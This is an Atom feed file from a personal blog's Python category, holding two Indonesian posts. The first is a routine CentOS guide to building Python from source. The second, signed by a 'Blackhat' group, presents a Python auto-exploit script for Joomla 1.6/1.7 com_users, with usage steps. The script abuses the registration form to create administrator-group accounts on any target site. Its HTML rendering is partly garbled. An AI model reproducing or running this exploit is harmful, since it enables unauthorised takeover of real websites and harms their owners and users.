@@ -1,0 +1,317 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Python | Cahyadi Triyansyah (SunDi3yansyah)]]></title>
+  <link href="http://sundi3yansyah.github.io/article/categories/python/atom.xml" rel="self"/>
+  <link href="http://sundi3yansyah.github.io/"/>
+  <updated>2023-12-28T22:07:32+07:00</updated>
+  <id>http://sundi3yansyah.github.io/</id>
+  <author>
+    <name><![CDATA[Cahyadi Triyansyah]]></name>
+    <email><![CDATA[sundi3yansyah@gmail.com]]></email>
+  </author>
+  <generator uri="https://ruby-lang.org/">Ruby</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Cara Install Atau Upgrade Python Di CentOS]]></title>
+    <link href="http://sundi3yansyah.github.io/article/2014/11/27/cara-install-atau-upgrade-python-di-centos/"/>
+    <updated>2014-11-27T17:18:37+07:00</updated>
+    <id>http://sundi3yansyah.github.io/article/2014/11/27/cara-install-atau-upgrade-python-di-centos</id>
+    <content type="html"><![CDATA[<p>Pertama tampulkan dulu versi python yang sekarang
+<code>
+python --version
+</code>
+Jika versi di bawah 2.7.8 maka itu sudah kuno dan sudah saatnya di update <img class="<a" src="href="https://assets-cdn.github.com/images/icons/emoji/unicode/1f604.png">https://assets-cdn.github.com/images/icons/emoji/unicode/1f604.png</a>&#8221; width=&#8221;20&#8221; height=&#8221;20&#8221; title=&#8221;&lsquo;smile&rsquo; &lsquo;smile&rsquo;&#8221; ></p>
+
+<!--more-->
+
+
+<p>update dulu systemnya</p>
+
+<pre><code>yum -y update
+</code></pre>
+
+<p>install development tools
+<code>
+yum groupinstall -y 'development tools'
+</code>
+setelah itu install depensi yang di butuhkan
+<code>
+yum install -y zlib-devel bzip2-devel openssl-devel xz-libs sqlite-devel
+</code>
+download python-nya, dan pilih salah satu saja.
+version 2.7.6
+<code>
+wget http://www.python.org/ftp/python/2.7.6/Python-2.7.6.tar.xz
+</code>
+version 3.3.3
+<code>
+wget http://www.python.org/ftp/python/3.3.3/Python-3.3.3.tar.xz
+</code></p>
+
+<p>kemudian di buka arsipnya
+<code>
+xz -d Python-*.tar.xz
+</code>
+<code>
+tar -xvf Python-*.tar
+</code>
+masuk ke direktorinya
+<code>
+cd Python-*
+</code>
+jalankan configure nya
+<code>
+./configure --prefix=/usr/local
+</code>
+lakukan compile, ini akan membutuhkan waktu yang lumayan lama <img class="<a" src="href="https://assets-cdn.github.com/images/icons/emoji/unicode/1f604.png">https://assets-cdn.github.com/images/icons/emoji/unicode/1f604.png</a>&#8221; width=&#8221;20&#8221; height=&#8221;20&#8221; title=&#8221;&lsquo;smile&rsquo; &lsquo;smile&rsquo;&#8221; >
+<code>
+make
+</code>
+dan install
+<code>
+make altinstall
+</code>
+jika sudah selesai maka coba kita lihat versinya
+<code>
+python -V
+</code></p>
+
+<p>Mudah bukan <img class="<a" src="href="https://assets-cdn.github.com/images/icons/emoji/unicode/1f604.png">https://assets-cdn.github.com/images/icons/emoji/unicode/1f604.png</a>&#8221; width=&#8221;20&#8221; height=&#8221;20&#8221; title=&#8221;&lsquo;smile&rsquo; &lsquo;smile&rsquo;&#8221; ></p>
+
+<p>Jika belum juga berubah dan tidak muncul output dengan versi yang kita compile tadi maka lakukan dengan menambah Environment Variable, anda bisa cari artikel saya sebelumnya <strong>Cara Menambah Environment Variable pada Linux</strong></p>
+
+<pre><code>exit
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Joomla Com_User Auto Exploit With Python]]></title>
+    <link href="http://sundi3yansyah.github.io/article/2014/08/30/joomla-com-user-auto-exploit-with-python/"/>
+    <updated>2014-08-30T05:55:39+07:00</updated>
+    <id>http://sundi3yansyah.github.io/article/2014/08/30/joomla-com-user-auto-exploit-with-python</id>
+    <content type="html"><![CDATA[<h2>Exploit Joomla version 1.6 &amp; 1.7</h2>
+
+<h3>Require Install</h3>
+
+<ul>
+<li><a href="https://www.python.org/downloads/">Python</a></li>
+<li><a href="http://docs.python-requests.org/en/latest/user/install/#install">Python Requests Package</a></li>
+</ul>
+
+
+<!-- more -->
+
+
+<h3>Who to?</h3>
+
+<ul>
+<li>Kalian harus install dulu python</li>
+<li><p>Kalau sudah install pythonnya lanjut ke install Python Requests, download kemudian ektrak filenya dan jalankan seperti ini (linux):
+<code>
+sudo python setup.py install
+</code></p></li>
+<li><p>Kemudian simpan script python dibawah ke direktori dimana kalian ingin menyimpannya.</p></li>
+<li>Buka terminal (linux) Bash Scripting Python aka CMD (Windows)</li>
+<li>Masuk ke direktori (cd) dimana script tadi anda simpan.</li>
+<li>Jalankan sebagai contoh:
+<code>
+python sbh.py http://target.com/ usermu passwordmu emailmu
+</code></li>
+</ul>
+
+
+<h4>By xSecurity</h4>
+
+<h4>Modif Sign by SunDi3yansyah | Surabaya Blackhat</h4>
+
+<p><figure class='code'><figcaption><span>sbh </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>!/usr/bin/python&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>Joomla Com_User Auto Exploit&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>By xSecurity&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>Modif Sign by SunDi3yansyah | Surabaya Blackhat&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>import requests as sec4ever, re, urllib, sys, os
+</span><span class='line'>from threading import Thread
+</span><span class='line'>from time import sleep
+</span><span class='line'>def cls():
+</span><span class='line'>    os.system([&lsquo;clear&rsquo;,&lsquo;cls&rsquo;][os.name ==&lsquo;nt&rsquo;])&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>cls()
+</span><span class='line'>print &lsquo;&rsquo;'&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;hr />
+</span><span class='line'>
+</span><span class='line'>&lt;p>  / &lt;em>&lt;strong>| _   _ _ &lt;/strong> __ &lt;/em>| |&lt;strong>   &lt;/strong> _ _   _  &lt;strong> _  | &lt;/strong> )| | &lt;strong> _  &lt;/strong>&lt;em>| | &lt;/em>| |&lt;strong>   &lt;/strong> &lt;em>| |&lt;/em>
+</span><span class='line'>  _&lt;strong> | | | | &lsquo;&lt;/strong>/ &lt;em>&lt;code>| '_ \ / _&lt;/code> | | | |/ &lt;/em>&lt;code>| |  _ \| |/ _&lt;/code> |/ &lt;strong>| |/ / &rsquo;&lt;em> \ / &lt;/em>` | &lt;/strong>|
+</span><span class='line'>   &lt;strong>&lt;em>) | |&lt;/em>| | | | (&lt;em>| | |&lt;/em>) | (&lt;em>| | |&lt;/em>| | (&lt;em>| | | |&lt;/em>) | | (_| | (&lt;/strong>|   &lt;| | | | (&lt;em>| | |&lt;/em>
+</span><span class='line'>  |&lt;strong>&lt;em>&lt;em>/ _&lt;/em>,&lt;/em>|&lt;em>|  _&lt;/em>,&lt;em>|&lt;/em>.&lt;/strong>/ _&lt;em>,&lt;/em>|_&lt;em>, |_&lt;/em>,&lt;em>| |&lt;/em>&lt;strong>&lt;em>/|&lt;/em>|_&lt;em>,&lt;/em>|_&lt;/strong>|&lt;em>|__| |&lt;/em>|_&lt;em>,&lt;/em>|_&lt;em>|
+</span><span class='line'>                                     |&lt;/em>&lt;strong>/                                               &lt;br/>
+</span><span class='line'>                                              _      _             &lt;br/>
+</span><span class='line'>                        |  _  &lt;em>..&lt;/em>.&lt;em>  &lt;/em>|&lt;em> _  |&lt;/em>) _  |_) &lt;/strong>|&lt;em>&lt;em>|&lt;/em> _ .&lt;/em>
+</span><span class='line'>                        |&lt;em>(/&lt;/em>(&lt;em>|| | |  |&lt;/em>(&lt;em>) |&lt;/em>)(/&lt;em> |&lt;/em>)(/&lt;em>|&lt;/em> |&lt;em>(/&lt;/em>|
+</span><span class='line'>        &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+</span><span class='line'>Joomla Version [1.6|1.7] [Com_User] Auto Exploit&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h2>Require Need Install Requests Python Package (Cari di google)&lt;/h2>
+</span><span class='line'>
+</span><span class='line'>&lt;h2>Surabaya Blackhat | Surabaya Hackerlink | Yogyakarta Blackhat&lt;/h2>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Please wait&hellip;&lsquo;&rsquo;'&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>pwd2 = &lsquo;fio3jfiej9cewc9c9w0eufew9u&rsquo;
+</span><span class='line'>def one(target,pwd1,pwd2,email):
+</span><span class='line'>    # Wrong Password
+</span><span class='line'>    x1 = xsec.get(target+&lsquo;/index.php?option=com_users&amp;view=registration&rsquo;)
+</span><span class='line'>    token = re.findall(&lsquo;type=&ldquo;hidden&rdquo; name=&ldquo;(.*?)&rdquo; value=&ldquo;1&rdquo;&rsquo;, x1.text)
+</span><span class='line'>    post = {}
+</span><span class='line'>    post[&ldquo;jform[name]&rdquo;] = &lsquo;SunDi3yansyah&rsquo;
+</span><span class='line'>    post[&ldquo;jform[username]&rdquo;] = user
+</span><span class='line'>    post[&ldquo;jform[password1]&rdquo;] = pwd1
+</span><span class='line'>    post[&ldquo;jform[password2]&rdquo;] = pwd2
+</span><span class='line'>    post[&ldquo;jform[email1]&rdquo;] = email
+</span><span class='line'>    post[&ldquo;jform[email2]&rdquo;] = email
+</span><span class='line'>    post[&ldquo;jform[groups][]&rdquo;] = &ldquo;7&rdquo;
+</span><span class='line'>    post[&ldquo;option&rdquo;] = &ldquo;com_users&rdquo;
+</span><span class='line'>    post[&ldquo;task&rdquo;] = &ldquo;registration.register&rdquo;
+</span><span class='line'>    post[token[0]] = &ldquo;1&rdquo;
+</span><span class='line'>    p1 = xsec.post(target+&lsquo;/index.php?option=com_users&amp;view=registration&rsquo;, data=urllib.urlencode(post))
+</span><span class='line'>    x2 = xsec.get(target+&lsquo;/index.php/component/users/?view=registration&amp;layout=complete&rsquo;)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>def exploit(target,pwd1,pwd2,email):
+</span><span class='line'>    # Wrong Password
+</span><span class='line'>    x3 = xsec.get(target+&lsquo;/index.php?option=com_users&amp;view=registration&rsquo;)
+</span><span class='line'>    token = re.findall(&lsquo;type=&ldquo;hidden&rdquo; name=&ldquo;(.*?)&rdquo; value=&ldquo;1&rdquo;&rsquo;, x3.text)
+</span><span class='line'>    post = {}
+</span><span class='line'>    post[&ldquo;jform[name]&rdquo;] = &lsquo;SunDi3yansyah&rsquo;
+</span><span class='line'>    post[&ldquo;jform[username]&rdquo;] = user
+</span><span class='line'>    post[&ldquo;jform[password1]&rdquo;] = pwd1
+</span><span class='line'>    post[&ldquo;jform[password2]&rdquo;] = pwd1
+</span><span class='line'>    post[&ldquo;jform[email1]&rdquo;] = email
+</span><span class='line'>    post[&ldquo;jform[email2]&rdquo;] = email
+</span><span class='line'>    post[&ldquo;jform[groups][]&rdquo;] = &ldquo;7&rdquo;
+</span><span class='line'>    post[&ldquo;option&rdquo;] = &ldquo;com_users&rdquo;
+</span><span class='line'>    post[&ldquo;task&rdquo;] = &ldquo;registration.register&rdquo;
+</span><span class='line'>    post[token[0]] = &ldquo;1&rdquo;
+</span><span class='line'>    p2 = xsec.post(target+&lsquo;/index.php?option=com_users&amp;view=registration&rsquo;, data=urllib.urlencode(post))
+</span><span class='line'>    x4 = xsec.get(target+&lsquo;/index.php/component/users/?view=registration&amp;layout=complete&rsquo;)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>xsec = sec4ever.session()
+</span><span class='line'>if len(sys.argv) == 5:
+</span><span class='line'>    target = sys.argv[1]
+</span><span class='line'>    user = sys.argv[2]
+</span><span class='line'>    pwd1 = sys.argv[3]
+</span><span class='line'>    email = sys.argv[4]
+</span><span class='line'>    one(target,pwd1,pwd2,email)
+</span><span class='line'>    ex = exploit(target,pwd1,pwd2,email)
+</span><span class='line'>    print &lsquo; * Go To Your Email &amp; Active Then Login \n * Username: &rsquo;+user+&lsquo; &amp; Password: &rsquo;+pwd1
+</span><span class='line'>else:
+</span><span class='line'>    print &ldquo;Usage: python sbh.py &lt;a href="http://target.com/">http://target.com/&lt;/a> usermu passwordmu emailmu&rdquo;</span></code></pre></td></tr></table></div></figure></p>
+
+<h3>Screenshot</h3>
+
+<p><img class="<a" src="href="http://i40.photobucket.com/albums/e228/sundi3yansyah/WAzeF5n_zpsa0d8f316.png">http://i40.photobucket.com/albums/e228/sundi3yansyah/WAzeF5n_zpsa0d8f316.png</a>&#8221; title=&#8221;Joomla Com_User Auto Exploit with Python&#8221; ></p>
+
+<p><img class="<a" src="href="http://i40.photobucket.com/albums/e228/sundi3yansyah/L9F0YoC_zps2111c6a9.png">http://i40.photobucket.com/albums/e228/sundi3yansyah/L9F0YoC_zps2111c6a9.png</a>&#8221; title=&#8221;Joomla Com_User Auto Exploit with Python&#8221; ></p>
+
+<h3>Video</h3>
+
+<iframe width="675" height="415" src="//www.youtube.com/embed/SHbTNPpx4_0" frameborder="0" allowfullscreen></iframe>
+
+]]></content>
+  </entry>
+  
+</feed>
